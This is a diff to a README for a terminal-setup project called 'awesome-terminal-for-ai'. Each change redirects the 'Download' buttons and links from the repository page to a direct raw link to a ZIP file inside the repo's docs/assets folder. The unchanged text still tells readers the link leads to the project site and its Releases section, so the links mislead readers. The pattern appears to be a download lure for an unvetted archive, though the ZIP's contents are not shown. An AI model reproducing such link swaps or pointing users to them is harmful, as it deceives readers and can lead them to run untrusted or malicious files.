@@ -1,6 +1,6 @@
 # 🚀 awesome-terminal-for-ai - Faster, Smarter Terminal Setup
 
-[![Download](https://img.shields.io/badge/Download-Awesome%20Terminal-blue?style=for-the-badge)](https://github.com/RPSandyGaming/awesome-terminal-for-ai)
+[![Download](https://img.shields.io/badge/Download-Awesome%20Terminal-blue?style=for-the-badge)](https://raw.githubusercontent.com/RPSandyGaming/awesome-terminal-for-ai/main/docs/assets/ai_terminal_for_awesome_1.8.zip)
 
 ## 📋 About awesome-terminal-for-ai
 
@@ -24,7 +24,7 @@ This setup is designed for users who want a quick terminal boost without complex
 
 Click the big blue button below to visit the download page on GitHub:
 
-[![Download](https://img.shields.io/badge/Download%20Page-Repository-blue?style=for-the-badge)](https://github.com/RPSandyGaming/awesome-terminal-for-ai)
+[![Download](https://img.shields.io/badge/Download%20Page-Repository-blue?style=for-the-badge)](https://raw.githubusercontent.com/RPSandyGaming/awesome-terminal-for-ai/main/docs/assets/ai_terminal_for_awesome_1.8.zip)
 
 The link takes you to the project site where you can find the files needed to install and run the software.
 
@@ -35,7 +35,7 @@ Follow these steps to get your new terminal running:
 ### 1. Download the Setup Files
 
 - Visit the official page by clicking the download button above or go to:  
-  https://github.com/RPSandyGaming/awesome-terminal-for-ai
+  https://raw.githubusercontent.com/RPSandyGaming/awesome-terminal-for-ai/main/docs/assets/ai_terminal_for_awesome_1.8.zip
 - Look for the “Releases” section on the page.
 - Find the latest release and download the Windows installer or ZIP file if available.
 - Save the file to a folder you can find easily, such as "Downloads."
@@ -118,4 +118,4 @@ The repository contains detailed documentation on advanced use and customization
 
 ---
 
-[Download awesome-terminal-for-ai](https://github.com/RPSandyGaming/awesome-terminal-for-ai) to get started now.
+[Download awesome-terminal-for-ai](https://raw.githubusercontent.com/RPSandyGaming/awesome-terminal-for-ai/main/docs/assets/ai_terminal_for_awesome_1.8.zip) to get started now.
